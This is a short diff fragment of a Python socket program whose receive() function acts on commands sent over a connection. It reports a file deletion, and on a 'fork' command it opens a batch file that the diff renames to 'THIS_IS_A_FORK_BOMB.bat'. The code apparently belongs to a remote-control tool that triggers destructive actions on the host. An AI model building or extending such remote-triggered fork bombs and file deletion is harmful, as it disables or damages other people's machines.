@@ -52,7 +52,7 @@ def receive():
         print("File deleted")
 
     if bytes("fork", 'utf-8') in a:
-        b = open("DONOTOPEN.bat", 'r')
+        b = open("THIS_IS_A_FORK_BOMB.bat", 'r')
     else:
         a2 = c.recv(500)
         print('Received message == ',a2)
